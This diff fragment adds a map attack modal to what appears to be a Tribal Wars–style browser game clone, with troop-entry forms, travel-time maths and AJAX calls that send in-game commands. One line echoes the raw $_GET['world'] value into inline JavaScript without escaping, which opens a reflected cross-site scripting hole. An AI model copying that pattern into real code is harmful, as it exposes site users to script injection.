+        font-family: Verdana, Arial;
+        vertical-align: middle;
+        display: inline-block;
+    }
+
+    .units_grid_simple table td a {
+        font-size: 10pt;
+        color: #804000;
+        cursor: pointer;
+        text-decoration: none;
+        font-weight: bold;
+        vertical-align: middle;
+        display: inline-block;
+        margin-left: 2px;
+    }
+
+    .units_grid_simple table td a:hover {
+        text-decoration: underline;
+        color: #0082BE;
+    }
+
+    /* Target Info */
+    .target_info {
+        background: #FFF;
+        border: 2px solid #8C5F0D;
+        border-radius: 4px;
+        padding: 8px 10px;
+        margin: 8px 0;
+    }
+
+    .target_info table {
+        width: 100%;
+        border-collapse: collapse;
+    }
+
+    .target_info img {
+        width: 48px;
+        height: 48px;
+    }
+
+    .target_info_text {
+        font-size: 11px;
+        line-height: 1.5;
+    }
+
+    /* Action Buttons */
+    .modal_actions {
+        text-align: center;
+        margin-top: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 6px;
+    }
+
+    .farm_btn {
+        width: 24px;
+        height: 24px;
+        background-image: url('/graphic/icons/icons_context.png');
+        background-position: -264px 0px;
+        border: 1px solid #8C5F0D;
+        cursor: not-allowed;
+        opacity: 0.4;
+        display: inline-block;
+        vertical-align: middle;
+        margin: 0 2px;
+    }
+
+    .farm_btn.farm_b {
+        background-position: -288px 0px;
+    }
+</style>
+
+<!-- Attack Modal -->
+<div id="attack_modal_overlay" onclick="closeAttackModal(event)">
+    <div id="attack_modal" onclick="event.stopPropagation()">
+        <div id="attack_modal_header">
+            <h3><?= __('screens.map.modal_title') ?: 'Enviar tropas' ?></h3>
+            <button id="attack_modal_close" onclick="closeAttackModal()"
+                title="<?= __('screens.map.close') ?: 'Fechar' ?>"></button>
+        </div>
+        <div id="attack_modal_body">
+            <!-- Units Grid - No Headers -->
+            <div class="units_grid_simple">
+                <table cellspacing="0" cellpadding="0">
+                    <tr>
+                        <!-- Column 1: Infantry -->
+                        <td class="unit_column" valign="top">
+                            <table cellspacing="0" cellpadding="0" width="110%">
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_spear.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_spear') ?: 'Lanceiro' ?>" alt=""><input
+                                            name="unit_spear" type="text" size="5" id="unit_spear"
+                                            max="<?= $units['unit_spear'] ?? 0 ?>" value=""><a
+                                            onclick="document.getElementById('unit_spear').value=<?= $units['unit_spear'] ?? 0 ?>">(<?= $units['unit_spear'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_sword.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_sword') ?: 'Espadachim' ?>" alt=""><input
+                                            name="unit_sword" type="text" size="5" id="unit_sword" value=""><a
+                                            onclick="document.getElementById('unit_sword').value=<?= $units['unit_sword'] ?? 0 ?>">(<?= $units['unit_sword'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_axe.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_axe') ?: 'Viking' ?>" alt=""><input
+                                            name="unit_axe" type="text" size="5" id="unit_axe" value=""><a
+                                            onclick="document.getElementById('unit_axe').value=<?= $units['unit_axe'] ?? 0 ?>">(<?= $units['unit_axe'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_archer.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_archer') ?: 'Arqueiro' ?>" alt=""><input
+                                            name="unit_archer" type="text" size="5" id="unit_archer" value=""><a
+                                            onclick="document.getElementById('unit_archer').value=0">(0)</a>
+                                    </td>
+                                </tr>
+                            </table>
+                        </td>
+
+                        <!-- Column 2: Cavalry -->
+                        <td class="unit_column" valign="top">
+                            <table cellspacing="0" cellpadding="0" width="120%">
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_spy.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_spy') ?: 'Explorador' ?>" alt=""><input
+                                            name="unit_spy" type="text" size="5" id="unit_spy" value=""><a
+                                            onclick="document.getElementById('unit_spy').value=<?= $units['unit_spy'] ?? 0 ?>">(<?= $units['unit_spy'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_light.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_light') ?: 'Cavalaria leve' ?>"
+                                            alt=""><input name="unit_light" type="text" size="5" id="unit_light"
+                                            value=""><a
+                                            onclick="document.getElementById('unit_light').value=<?= $units['unit_light'] ?? 0 ?>">(<?= $units['unit_light'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_marcher.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_marcher') ?: 'Arqueiro a cavalo' ?>"
+                                            alt=""><input name="unit_marcher" type="text" size="5" id="unit_marcher"
+                                            value=""><a
+                                            onclick="document.getElementById('unit_marcher').value=0">(0)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_heavy.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_heavy') ?: 'Cavalaria pesada' ?>"
+                                            alt=""><input name="unit_heavy" type="text" size="2" id="unit_heavy"
+                                            value=""><a
+                                            onclick="document.getElementById('unit_heavy').value=<?= $units['unit_heavy'] ?? 0 ?>">(<?= $units['unit_heavy'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                            </table>
+                        </td>
+
+                        <!-- Column 3: Siege -->
+                        <td class="unit_column" valign="top">
+                            <table cellspacing="0" cellpadding="0" width="110%">
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_ram.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_ram') ?: 'Aríete' ?>" alt=""><input
+                                            name="unit_ram" type="text" size="5" id="unit_ram" value=""><a
+                                            onclick="document.getElementById('unit_ram').value=<?= $units['unit_ram'] ?? 0 ?>">(<?= $units['unit_ram'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_catapult.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_catapult') ?: 'Catapulta' ?>" alt=""><input
+                                            name="unit_catapult" type="text" size="5" id="unit_catapult" value=""><a
+                                            onclick="document.getElementById('unit_catapult').value=<?= $units['unit_catapult'] ?? 0 ?>">(<?= $units['unit_catapult'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <!-- Catapult Target Selector -->
+                                <tr id="catapult_target_row" style="display: none;">
+                                    <td colspan="2">
+                                        <table class="vis" width="100%" style="margin-top: 5px;">
+                                            <tr>
+                                                <th><?= __('screens.map.catapult_target') ?></th>
+                                                <td>
+                                                    <select name="building" id="modal_building_select" size="1">
+                                                        <?php
+                                                        if (isset($cl_builds) && is_object($cl_builds)):
+                                                            foreach ($cl_builds->get_array("dbname") as $dbname):
+                                                                $specials = $cl_builds->get_specials($dbname) ?? [];
+                                                                if (!in_array("catapult_protection", $specials)):
+                                                                    ?>
+                                                                    <option value="<?= $dbname ?>">
+                                                                        <?= $cl_builds->get_name($dbname) ?>
+                                                                    </option>
+                                                                    <?php
+                                                                endif;
+                                                            endforeach;
+                                                        endif;
+                                                        ?>
+                                                    </select>
+                                                </td>
+                                            </tr>
+                                        </table>
+                                    </td>
+                                </tr>
+                            </table>
+                        </td>
+
+                        <!-- Column 4: Other -->
+                        <td class="unit_column" valign="top">
+                            <table cellspacing="0" cellpadding="0" width="110%">
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_knight.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_paladin') ?: 'Paladino' ?>" alt=""><input
+                                            name="unit_knight" type="text" size="5" id="unit_knight" value=""><a
+                                            onclick="document.getElementById('unit_knight').value=<?= $units['unit_knight'] ?? 0 ?>">(<?= $units['unit_knight'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td><img src="/graphic/unit/unit_snob.png" style="width: 18px; height: 18px;"
+                                            title="<?= __('screens.map.unit_noble') ?: 'Nobre' ?>" alt=""><input
+                                            name="unit_snob" type="text" size="5" id="unit_snob" value=""><a
+                                            onclick="document.getElementById('unit_snob').value=<?= $units['unit_snob'] ?? 0 ?>">(<?= $units['unit_snob'] ?? 0 ?>)</a>
+                                    </td>
+                                </tr>
+                                <?php if (!empty($config['church'])): ?>
+                                    <tr>
+                                        <td><img src="/graphic/unit/unit_mnich.png" style="width: 18px; height: 18px;"
+                                                title="<?= __('screens.map.unit_monk') ?: 'Monge' ?>" alt=""><input
+                                                name="unit_monk" type="text" size="5" id="unit_monk" value=""><a
+                                                onclick="document.getElementById('unit_monk').value=<?= $units['unit_mnich'] ?? 0 ?>">(<?= $units['unit_mnich'] ?? 0 ?>)</a>
+                                        </td>
+                                    </tr>
+                                <?php endif; ?>
+                            </table>
+                        </td>
+                    </tr>
+                </table>
+            </div>
+
+            <!-- All Troops Link -->
+            <div style="padding: 5px 10px; background: transparent;">
+                <a href="#" onclick="fillAllUnits(); return false;"
+                    style="font-size: 10pt; color: #804000; font-weight: bold; text-decoration: none;"><?= __('screens.map.all_troops') ?></a>
+            </div>
+
+            <!-- Target Village Info -->
+            <div class="target_info">
+                <table cellspacing="0" cellpadding="0">
+                    <tr>
+                        <td width="60" style="text-align: center;">
+                            <img src="/graphic/map/v1.png" id="target_village_img" alt="">
+                        </td>
+                        <td class="target_info_text">
+                            <strong id="target_village_name"><?= __('screens.map.village') ?: 'Aldeia' ?></strong><br>
+                            <span id="target_village_owner"><?= __('screens.map.owner') ?: 'Proprietário' ?>:
+                                -</span><br>
+                            <span id="target_village_distance"><?= __('screens.map.distance') ?: 'Distância' ?>: -
+                                <?= __('screens.map.fields') ?: 'campos' ?></span>
+                        </td>
+                    </tr>
+                </table>
+            </div>
+
+            <!-- Action Buttons -->
+            <div class="modal_actions">
+                <button class="btn btn-attack" onclick="sendCommand('attack')"><?= __('screens.map.attack') ?></button>
+                <button class="btn btn-support"
+                    onclick="sendCommand('support')"><?= __('screens.map.support') ?></button>
+                <!--<span class="farm_btn" title="Farm A (Premium)"></span>
+                        <span class="farm_btn farm_b" title="Farm B (Premium)"></span>
+                        -->
+                <a href="game.php?village=<?= $village['id'] ?>&screen=am_farm&action=attack&target_id=<?= $target['id'] ?>&template=A&h=<?= $hkey ?>"
+                    class="farm-btn">
+                    <div style="width: 24px; height: 24px; background-image: url('/graphic/icons/icons_context.png'); background-position: -264px 0; background-repeat: no-repeat; display: inline-block;"
+                        title="<?= __('screens.map.attack_with_template_a') ?: 'Atacar com modelo A' ?>"></div>
+                </a>
+                <a href="game.php?village=<?= $village['id'] ?>&screen=am_farm&action=attack&target_id=<?= $target['id'] ?>&template=B&h=<?= $hkey ?>"
+                    class="farm-btn">
+                    <div style="width: 24px; height: 24px; background-image: url('/graphic/icons/icons_context.png'); background-position: -288px 0; background-repeat: no-repeat; display: inline-block;"
+                        title="<?= __('screens.map.attack_with_template_b') ?: 'Atacar com modelo B' ?>"></div>
+                </a>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Global variables for map modal
+    var currentTargetVillage = null;
+    var currentTargetX = 0;
+    var currentTargetY = 0;
+    var currentTargetOwner = '';
+    var currentTargetCoords = '';
+    var mapMenuTimer = null;
+
+    // Unit speeds in min/field (standard Tribal Wars values)
+    // world movement_speed: higher = faster travel
+    var worldSpeed = <?= (float) ($config['movement_speed'] ?? 1) ?>;
+    var unitSpeeds = {
+        spear: 18,
+        sword: 22,
+        axe: 18,
+        archer: 18,
+        spy: 9,
+        light: 10,
+        cav_archer: 10,
+        heavy: 11,
+        ram: 30,
+        catapult: 30,
+        paladin: 10,
+        snob: 35,
+        monk: 20
+    };
+
+    function calcTravelTime(units, distance) {
+        var slowest = 0;
+        for (var u in units) {
+            if (parseInt(units[u]) > 0 && unitSpeeds[u] !== undefined) {
+                if (unitSpeeds[u] > slowest) slowest = unitSpeeds[u];
+            }
+        }
+        if (slowest === 0 || distance === 0) return 0;
+        // TW formula: travel_minutes = (distance * speed_min_per_field) / world_speed_multiplier
+        return (distance * slowest) / worldSpeed;
+    }
+
+    function formatDuration(totalMinutes) {
+        var h = Math.floor(totalMinutes / 60);
+        var m = Math.floor(totalMinutes % 60);
+        var s = Math.floor((totalMinutes * 60) % 60);
+        return (h < 10 ? '0' : '') + h + ':' + (m < 10 ? '0' : '') + m + ':' + (s < 10 ? '0' : '') + s;
+    }
+
+    function formatArrival(totalMinutes) {
+        var arr = new Date(Date.now() + totalMinutes * 60000);
+        var today = new Date();
+        var isToday = arr.toDateString() === today.toDateString();
+        var tomorrow = new Date(today); tomorrow.setDate(today.getDate() + 1);
+        var isTomorrow = arr.toDateString() === tomorrow.toDateString();
+        var timeStr = (arr.getHours() < 10 ? '0' : '') + arr.getHours() + ':'
+            + (arr.getMinutes() < 10 ? '0' : '') + arr.getMinutes() + ':'
+            + (arr.getSeconds() < 10 ? '0' : '') + arr.getSeconds();
+        if (isToday) return '<?= __('screens.map.today') ?: 'Hoje' ?> às ' + timeStr;
+        if (isTomorrow) return '<?= __('screens.map.tomorrow') ?: 'Amanhã' ?> às ' + timeStr;
+        return arr.toLocaleDateString() + ' ' + timeStr;
+    }
+
+    // Context Menu Functions
+    function showMapMenu(target, villageId) {
+        var menu = document.getElementById('map_context_menu');
+        var rect = target.getBoundingClientRect();
+
+        menu.style.left = (rect.left + window.scrollX - 48) + 'px';
+        menu.style.top = (rect.top + window.scrollY - 40) + 'px';
+        menu.style.display = 'block';
+
+        // Get target village data from the link's title attribute
+        var targetLink = target.querySelector('img');
+        var titleText = targetLink ? targetLink.getAttribute('title') : '';
+
+        // Parse village name and coordinates
+        var villageName = target.dataset.vname || '<?= __('screens.map.village') ?: 'Aldeia' ?>';
+        var villageOwner = target.dataset.vowner || '<?= __('screens.map.barbarian') ?: 'Bárbara' ?>';
+        var villageX = target.dataset.vx ? parseInt(target.dataset.vx) : 0;
+        var villageY = target.dataset.vy ? parseInt(target.dataset.vy) : 0;
+
+        // Fallback for old HTML map (reads from img title)
+        if (!target.dataset.vname && titleText) {
+            var parts = titleText.split(' - ');
+            if (parts.length > 0) {
+                var firstPart = parts[0];
+                var nameMatch = firstPart.match(/^(.+?)\s+\((\d+)\|(\d+)\)/);
+                if (nameMatch) {
+                    villageName = nameMatch[1];
+                    villageX = parseInt(nameMatch[2]);
+                    villageY = parseInt(nameMatch[3]);
+                }
+            }
+            if (parts.length > 1 && parts[1].trim() !== '') {
+                villageOwner = parts[1].split('(')[0].trim();
+            }
+        }
+
+        var imageSrc = targetLink ? targetLink.getAttribute('src') : '/graphic/map/v1.png';
+
+        // Info
+        document.getElementById('mp_info').href = "game.php?village=<?= $village['id'] ?>&screen=info_village&id=" + villageId;
+
+        // Attack - Open Modal
+        document.getElementById('mp_att').onclick = function (e) {
+            e.preventDefault();
+            hideMapMenu();
+            openAttackModal(villageId, villageName, villageOwner, villageX, villageY, imageSrc);
+            return false;
+        };
+        document.getElementById('mp_att').href = "#";
+
+        // Resources (Market)
+        document.getElementById('mp_res').href = "game.php?village=<?= $village['id'] ?>&screen=market&mode=send&target=" + villageId;
+
+        // Farm A/B - Only enable if user has farm assistant
+        <?php if ($has_farm_assistant): ?>
+            document.getElementById('mp_farm_a').onclick = function (e) {
+                e.preventDefault();
+                hideMapMenu();
+                window.location.href = 'game.php?village=<?= $village['id'] ?>&screen=am_farm&action=attack_from_map&target=' + villageId + '&template=A&h=<?= $hkey ?>';
+                return false;
+            };
+            document.getElementById('mp_farm_b').onclick = function (e) {
+                e.preventDefault();
+                hideMapMenu();
+                window.location.href = 'game.php?village=<?= $village['id'] ?>&screen=am_farm&action=attack_from_map&target=' + villageId + '&template=B&h=<?= $hkey ?>';
+                return false;
+            };
+        <?php else: ?>
+            document.getElementById('mp_farm_a').onclick = function (e) {
+                e.preventDefault();
+                alert('<?= __('screens.map.farm_assistant_required') ?>');
+                return false;
+            };
+            document.getElementById('mp_farm_b').onclick = function (e) {
+                e.preventDefault();
+                alert('<?= __('screens.map.farm_assistant_required') ?: 'Necessita do Assistente de Saque premium para usar esta funcionalidade.' ?>');
+                return false;
+            };
+        <?php endif; ?>
+
+    }
+
+    function hideMapMenu() {
+        mapMenuTimer = setTimeout(function () {
+            document.getElementById('map_context_menu').style.display = 'none';
+        }, 500);
+    }
+
+    function cancelHideMenu() {
+        if (mapMenuTimer) {
+            clearTimeout(mapMenuTimer);
+            mapMenuTimer = null;
+        }
+    }
+
+    // Modal Functions
+    function openAttackModal(villageId, villageName, villageOwner, villageX, villageY, imageSrc) {
+        currentTargetVillage = villageId;
+        currentTargetX = villageX;
+        currentTargetY = villageY;
+        currentTargetOwner = villageOwner;
+        currentTargetCoords = '(' + villageX + '|' + villageY + ')';
+
+        // Update target info
+        if (imageSrc) {
+            document.getElementById('target_village_img').src = imageSrc;
+        }
+        document.getElementById('target_village_name').textContent = villageName;
+        document.getElementById('target_village_owner').textContent = '<?= __('screens.map.owner') ?>: ' + villageOwner;
+
+        // Calculate distance
+        var currentX = <?= $village['x'] ?>;
+        var currentY = <?= $village['y'] ?>;
+        var distance = Math.sqrt(Math.pow(villageX - currentX, 2) + Math.pow(villageY - currentY, 2)).toFixed(1);
+        document.getElementById('target_village_distance').textContent = '<?= __('screens.map.distance') ?>: ' + distance + ' <?= __('screens.map.fields') ?>';
+
+        // Show modal
+        document.getElementById('attack_modal_overlay').style.display = 'flex';
+    }
+
+    function closeAttackModal(event) {
+        if (!event || event.target.id === 'attack_modal_overlay') {
+            // Cancel any pending page reload so closing doesn't trigger it
+            if (window.reloadTimer) {
+                clearTimeout(window.reloadTimer);
+                window.reloadTimer = null;
+            }
+            // Restore modal body to original units form so it can be reopened
+            if (window.originalModalHTML) {
+                document.getElementById('attack_modal_body').innerHTML = window.originalModalHTML;
+                // Re-attach catapult listener after restoring
+                var catapultInput = document.getElementById('unit_catapult');
+                if (catapultInput) {
+                    catapultInput.addEventListener('input', updateCatapultTarget);
+                    catapultInput.addEventListener('change', updateCatapultTarget);
+                }
+            }
+            document.getElementById('attack_modal_overlay').style.display = 'none';
+            currentTargetVillage = null;
+        }
+    }
+
+
+    function sendCommand(type) {
+        if (!currentTargetVillage) return;
+
+        // Collect unit values
+        var units = {
+            spear: document.getElementById('unit_spear').value || 0,
+            sword: document.getElementById('unit_sword').value || 0,
+            axe: document.getElementById('unit_axe').value || 0,
+            archer: document.getElementById('unit_archer').value || 0,
+            spy: document.getElementById('unit_spy').value || 0,
+            light: document.getElementById('unit_light').value || 0,
+            cav_archer: document.getElementById('unit_marcher').value || 0,
+            heavy: document.getElementById('unit_heavy').value || 0,
+            ram: document.getElementById('unit_ram').value || 0,
+            catapult: document.getElementById('unit_catapult').value || 0,
+            paladin: document.getElementById('unit_knight').value || 0,
+            snob: document.getElementById('unit_snob').value || 0,
+            monk: (document.getElementById('unit_monk') ? document.getElementById('unit_monk').value : 0) || 0
+        };
+
+        // Check if any units selected
+        var hasUnits = false;
+        for (var unit in units) {
+            if (parseInt(units[unit]) > 0) {
+                hasUnits = true;
+                break;
+            }
+        }
+
+        if (!hasUnits) {
+            alert('<?= __('screens.map.select_troops') ?>');
+            return;
+        }
+
+        // Show confirmation screen
+        showConfirmation(type, units);
+    }
+
+    function showConfirmation(type, units) {
+        var modalBody = document.getElementById('attack_modal_body');
+        var targetName = document.getElementById('target_village_name').textContent;
+
+        // Save original content BEFORE replacing it with loading state
+        window.originalModalContent = modalBody.innerHTML;
+        window.currentCommandType = type;
+        window.currentCommandUnits = units;
+
+        // Show loading state
+        modalBody.innerHTML = '<div style="padding: 40px; text-align: center;"><?= __('screens.map.loading') ?></div>';
+
+        // Calculate travel time
+        var currentX = <?= $village['x'] ?>;
+        var currentY = <?= $village['y'] ?>;
+        var distance = Math.sqrt(Math.pow(currentTargetX - currentX, 2) + Math.pow(currentTargetY - currentY, 2));
+        var travelMinutes = calcTravelTime(units, distance);
+        var durationStr = formatDuration(travelMinutes);
+        var arrivalStr = formatArrival(travelMinutes);
+
+        var villageUnits = {
+            'spear': <?= $units['unit_spear'] ?? 0 ?>,
+            'sword': <?= $units['unit_sword'] ?? 0 ?>,
+            'axe': <?= $units['unit_axe'] ?? 0 ?>,
+            'archer': <?= $units['unit_archer'] ?? 0 ?>,
+            'spy': <?= $units['unit_spy'] ?? 0 ?>,
+            'light': <?= $units['unit_light'] ?? 0 ?>,
+            'cav_archer': <?= $units['unit_marcher'] ?? 0 ?>,
+            'heavy': <?= $units['unit_heavy'] ?? 0 ?>,
+            'ram': <?= $units['unit_ram'] ?? 0 ?>,
+            'catapult': <?= $units['unit_catapult'] ?? 0 ?>,
+            'paladin': <?= $units['unit_knight'] ?? 0 ?>,
+            'snob': <?= $units['unit_snob'] ?? 0 ?>
+            <?php if (!empty($config['church'])): ?>
+            ,'monk': <?= $units['unit_mnich'] ?? 0 ?>
+            <?php endif; ?>
+        };
+
+        // Prepare form data
+        var formData = new FormData();
+        formData.append('type', type);
+        formData.append('targetId', currentTargetVillage);
+        formData.append('targetName', targetName + ' ' + currentTargetCoords);
+        formData.append('targetPlayer', currentTargetOwner);
+        formData.append('duration', durationStr);
+        formData.append('arrival', arrivalStr);
+        formData.append('units', JSON.stringify(units));
+        formData.append('villageUnits', JSON.stringify(villageUnits));
+
+        // Get catapult target if present
+        var buildingSelect = document.getElementById('modal_building_select');
+        if (buildingSelect) {
+            formData.append('building', buildingSelect.value);
+        }
+
+        // Fetch confirmation HTML from server
+        fetch('/ajax/ajax_attack_confirm.php?world=<?= $_GET['world'] ?? 1 ?>', {
+            method: 'POST',
+            body: formData
+        })
+            .then(response => response.text())
+            .then(html => {
+                modalBody.innerHTML = html;
+            })
+            .catch(error => {
+                console.error('Error loading confirmation:', error);
+                modalBody.innerHTML = '<div style="padding: 20px; color: red;"><?= __('screens.map.error_loading') ?></div>';
+            });
+    }
+
+    function cancelConfirmation() {
+        var modalBody = document.getElementById('attack_modal_body');
+        modalBody.innerHTML = window.originalModalContent;
+    }
+
+
+    // --- Multi Attack Logic ---
+    window.isMultiAttack = false;
+
+    function initMultiAttack() {
+        window.isMultiAttack = true;
+        document.getElementById('single_attack_ui').style.display = 'none';
+        document.getElementById('multi_attack_ui').style.display = 'block';
+        updateMultiAttackTotals();
+    }
+
+    function addMultiAttackRow() {
+        var tbody = document.getElementById('multi_attack_rows');
+        var nextNum = parseInt(document.getElementById('next_attack_num').innerText);
+        
+        // Clone the first row
+        var templateRow = document.getElementById('row_attack_1');
+        var newRow = templateRow.cloneNode(true);
+        newRow.id = 'row_attack_' + nextNum;
+        newRow.dataset.row = nextNum;
+        
+        // Update labels and inputs
+        var cells = newRow.getElementsByTagName('td');
+        cells[0].innerHTML = 'Atacar #' + nextNum + ' <a href="#" onclick="removeMultiAttackRow(' + nextNum + '); return false;" style="color:red; font-weight:bold; margin-left: 5px;">X</a>';
+        
+        var inputs = newRow.getElementsByTagName('input');
+        for (var i = 0; i < inputs.length; i++) {
+            var unit = inputs[i].name.split('_')[2]; // multi_unit_spear_1 -> spear
+            inputs[i].name = 'multi_unit_' + unit + '_' + nextNum;
+            inputs[i].value = 0;
+        }
+        
+        tbody.appendChild(newRow);
+        
+        document.getElementById('next_attack_num').innerText = nextNum + 1;
+        updateMultiAttackTotals();
+    }
+
+    function removeMultiAttackRow(rowNum) {
+        var row = document.getElementById('row_attack_' + rowNum);
+        if (row) {
+            row.parentNode.removeChild(row);
+            updateMultiAttackTotals();
+        }
+    }
+
+    function updateMultiAttackTotals() {
+        var allUnits = ['spear','sword','axe','archer','spy','light','marcher','heavy','ram','catapult','knight','snob','monk'];
+        
+        allUnits.forEach(function(unit) {
+            var total = 0;
+            var inputs = document.querySelectorAll('input[name^="multi_unit_' + unit + '_"]');
+            inputs.forEach(function(input) {
+                total += parseInt(input.value) || 0;
+            });
+            
+            var totalCells = document.querySelectorAll('.total_val[data-unit="' + unit + '"]');
+            totalCells.forEach(function(cell) {
+                cell.innerText = total;
+            });
+            
+            // Check vs village capacity
+            var villageCells = document.querySelectorAll('.village_unit_count[data-unit="' + unit + '"]');
+            if (villageCells.length > 0) {
+                var max = parseInt(villageCells[0].innerText) || 0;
+                totalCells.forEach(function(cell) {
+                    if (total > max) {
+                        cell.style.color = 'red';
+                        cell.style.fontWeight = 'bold';
+                    } else {
+                        cell.style.color = '';
+                        cell.style.fontWeight = 'normal';
+                    }
+                });
+            }
+        });
+    }
+
+    // Rewrite confirmCommand to handle multiple sequential attacks
+    function confirmCommand(type) {
+        var modalBody = document.getElementById('attack_modal_body');
+        
+        // 1. Collect all attacks to send
+        var attacksQueue = [];
+        
+        if (window.isMultiAttack) {
+            var rows = document.querySelectorAll('.attack_row');
+            rows.forEach(function(row) {
+                var rowNum = row.dataset.row;
+                var attackUnits = {};
+                var hasUnits = false;
+                
+                var inputs = row.querySelectorAll('input[name^="multi_unit_"]');
+                inputs.forEach(function(input) {
+                    var unitName = input.name.split('_')[2]; // multi_unit_spear_1 -> spear
+                    var qty = parseInt(input.value) || 0;
+                    if (qty > 0) {
+                        attackUnits[unitName] = qty;
+                        hasUnits = true;
+                    }
+                });
+                
+                if (hasUnits) {
+                    attacksQueue.push(attackUnits);
+                }
+            });
+        } else {
+            attacksQueue.push(window.currentCommandUnits);
+        }
+
+        if (attacksQueue.length === 0) {
+            alert('<?= __('screens.map.select_troops') ?>');
+            return;
+        }
+
+        console.log('Attacks Queue:', attacksQueue);
+
+        // Show loading state
+        modalBody.innerHTML = '<div style="padding: 40px; text-align: center;"><p><?= __('screens.map.sending') ?> (1/' + attacksQueue.length + ')</p></div>';
+
+        // Add catapult target if selected
+        var buildingSelect = document.getElementById('modal_building_select');
+        var catapultTarget = buildingSelect ? buildingSelect.value : null;
+
+        // Process queue sequentially
+        processAttackQueue(attacksQueue, 0, type, catapultTarget, modalBody);
+    }
+
+    function processAttackQueue(queue, currentIndex, type, catapultTarget, modalBody) {
+        if (currentIndex >= queue.length) {
+            // All done!
+            modalBody.innerHTML = '<div style="padding: 40px; text-align: center; color: green;"><p>Comandos enviados com sucesso!</p></div>';
+            setTimeout(function() {
+                closeAttackModal();
+                // Optionally reload map data here
+            }, 1500);
+            return;
+        }
+
+        modalBody.innerHTML = '<div style="padding: 40px; text-align: center;"><p><?= __('screens.map.sending') ?> (' + (currentIndex + 1) + '/' + queue.length + ')...</p></div>';
+
+        var units = queue[currentIndex];
+        var formData = new FormData();
+        formData.append('village', '<?= $village['id'] ?>');
+        formData.append('target', currentTargetVillage);
+        formData.append('type', type);
+        
+        if (catapultTarget) {
+            formData.append('building', catapultTarget);
+        }
+
+        // Add units
+        for (var unit in units) {
+            if (parseInt(units[unit]) > 0) {
+                // Handle different mapping if needed, e.g. mnich vs monk
+                var paramName = unit === 'monk' ? 'unit_mnich' : 'unit_' + unit;
+                formData.append(paramName, units[unit]);
+            }
+        }
+
+        // Submit via AJAX
+        fetch('game.php?village=<?= $village['id'] ?>&screen=place&action=command', {
+            method: 'POST',
+            headers: {
+                'X-Requested-With': 'XMLHttpRequest'
+            },
+            body: formData
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.success) {
+                // Wait 200ms before sending the next one to mimic human or proper server spacing
+                setTimeout(function() {
+                    processAttackQueue(queue, currentIndex + 1, type, catapultTarget, modalBody);
+                }, 200);
+            } else {
+                modalBody.innerHTML = '<div style="padding: 20px; color: red;">Erro (Ataque ' + (currentIndex + 1) + '): ' + (data.error || 'Erro desconhecido') + '</div>';
+            }
+        })
+        .catch(error => {
+            console.error('Error sending attack:', error);
+            modalBody.innerHTML = '<div style="padding: 20px; color: red;">Erro ao comunicar com o servidor.</div>';
+        });
+    }
+
+    function fillAllUnits() {
+        // Fill all unit inputs with their maximum values
+        var unitIds = ['unit_spear', 'unit_sword', 'unit_axe', 'unit_archer',
+            'unit_spy', 'unit_light', 'unit_marcher', 'unit_heavy',
+            'unit_ram', 'unit_catapult', 'unit_knight', 'unit_snob', 'unit_monk'];
+
+        unitIds.forEach(function (id) {
+            var input = document.getElementById(id);
+            if (input) {
+                var maxAttr = input.getAttribute('max');
+                if (maxAttr) {
+                    input.value = maxAttr;
+                } else {
+                    // Extract from the adjacent <a> element which has the format "(123)"
+                    var link = input.nextElementSibling;
+                    if (link && link.tagName === 'A') {
+                        var text = link.textContent.replace(/[()]/g, '');
+                        input.value = parseInt(text) || 0;
+                    }
+                }
+            }
+        });
+    }
+
+    // Attach event listeners
+    document.addEventListener('DOMContentLoaded', function () {
+        // Save the original modal body HTML (units form) so we can restore it after closing
+        window.originalModalHTML = document.getElementById('attack_modal_body').innerHTML;
+
+        // Move context menu to body
+        var menu = document.getElementById('map_context_menu');
+        if (menu) {
+            document.body.appendChild(menu);
+
+            menu.addEventListener('mouseenter', cancelHideMenu);
+            menu.addEventListener('mouseleave', hideMapMenu);
+        }
+
+        // Attach click handlers to village links
+        document.querySelectorAll('td[id^="tile_"] a[href*="screen=info_village"]').forEach(function (link) {
+            link.addEventListener('click', function (e) {
+                e.preventDefault();
+                var villageId = new URL(this.href).searchParams.get('id');
+                var tile = this.closest('td');
+                showMapMenu(tile, villageId);
+            });
+        });
+
+        // Initial catapult check
+        var catapultInput = document.getElementById('unit_catapult');
+        if (catapultInput) {
+            catapultInput.addEventListener('input', updateCatapultTarget);
+            catapultInput.addEventListener('change', updateCatapultTarget);
+            catapultInput.addEventListener('blur', updateCatapultTarget);
+            updateCatapultTarget(); // Initial check
+        }
+    });
+
